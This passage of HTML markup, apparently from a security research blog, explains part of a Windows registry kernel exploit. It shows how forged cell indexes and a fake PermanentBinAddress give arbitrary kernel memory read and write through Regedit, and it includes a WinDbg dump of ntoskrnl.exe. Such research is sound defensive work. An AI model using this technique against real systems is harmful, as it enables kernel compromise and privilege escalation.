 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;So, the cell index for the KernelData value will be &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;0x8FE29000&lt;/span&gt;&lt;span&gt;, and with that, we have all the puzzle pieces needed to assemble our intricate construction.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is illustrated in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivAoJErrjkIcSz5FCYQGUSDLv9NQ02RtXTnd9RuHHPvxdfL8vyBwXWfx_zu5JKtCPqV0dXqoDsObJLaW2rU0L6Xpms2s-cdfJUrberJ7We5fOBeFKg7vZzfVphslPqVgYEl7ykIk9sKbkqR3bTExByRs_VlBU-RKlSRrIp1CyKIu26wev7gIHNmtzlJRA/s1999/image18.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivAoJErrjkIcSz5FCYQGUSDLv9NQ02RtXTnd9RuHHPvxdfL8vyBwXWfx_zu5JKtCPqV0dXqoDsObJLaW2rU0L6Xpms2s-cdfJUrberJ7We5fOBeFKg7vZzfVphslPqVgYEl7ykIk9sKbkqR3bTExByRs_VlBU-RKlSRrIp1CyKIu26wev7gIHNmtzlJRA/s1200/image18.png&quot; border=&quot;0&quot; alt=&quot;Diagram described below&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram described below&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The cell map walk for the KernelAddr value is shown on the right side of the _CMHIVE structure, and the cell map walk for KernelData is on the left.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The dashed arrows marked with numbers &amp;#9312;, &amp;#9313;, and &amp;#9314; correspond to the consecutive elements of the cell index (i.e., directory index, table index, and offset), while the solid arrows represent dereferences of individual pointers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As you can see, we successfully managed to select indexes where the data of one value directly influences the target virtual address to which the other one is resolved.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;We could end this section right here, but there is one more minor issue I&amp;#39;d like to mention.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As you may recall, the HvpGetCellPaged function ends with the following statement:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(Entry-&amp;gt;PermanentBinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(~0xF))&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Entry-&amp;gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(Index&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xFFF)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;4;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Our current assumption is that the PermanentBinAddress and the lower 12 bits of the index are both zero, and BlockOffset contains the exact value of the address we want to access. Unfortunately, the expression ends with the extra &amp;quot;+4&amp;quot;. Normally, this skips the cell size and directly returns a pointer to the cell&amp;#39;s data, but in our exploit, it means we would see a view of the kernel memory shifted by four bytes. This isn&amp;#39;t a huge issue in practical terms, but it doesn&amp;#39;t look perfect in a demonstration.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c23 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;So, can we do anything about this? It turns out, we can. What we want to achieve is to subtract 4 from the final result using the other controlled addends in the expression (PermanentBinAddress and BlockOffset). Individually, each of them has some limitations:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6 ormwWEjHLs-c23&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_kzn99s8ciqwj-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;The PermanentBinAddress is a fully controlled 64-bit field, but only its upper 60 bits are used when constructing the cell address. This means we can only use it to subtract multiples of 0x10, but not exactly 4.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;The cell offset is a 12-bit unsigned number, so we can use it to add any number in the 1&amp;ndash;4095 range, but we can&amp;#39;t subtract anything.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;However, we can combine both of them together to achieve the desired goal. If we set PermanentBinAddress to 0xFFFFFFFFFFFFFFF0 (-0x10 in 64-bit representation) and the cell offset to 0xC, their sum will be -4, which will mutually reduce with the unconditionally added +4, causing the HvpGetCellPaged function to return exactly Entry-&amp;gt;BlockOffset. For our exploit, this means one additional write to the _CMHIVE structure to properly initialize the fake PermanentBinAddress field, and a slight change in the cell index of the KernelData value from the previous 0x8FE29000 to &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;0x8FE2900C&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;. If we perform all these steps correctly, we should be able to read and write arbitrary kernel memory via Regedit. For example, let&amp;#39;s dump the data at the beginning of the ntoskrnl.exe kernel image using WinDbg:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Evaluate&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;expression:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-8781857554432&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;/c8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800004&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800004&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`5080000c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;b8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800014&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;....@...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`5080001c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800024&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`5080002c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800034&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`5080003c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0e&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ba&lt;/span&gt;&lt;span 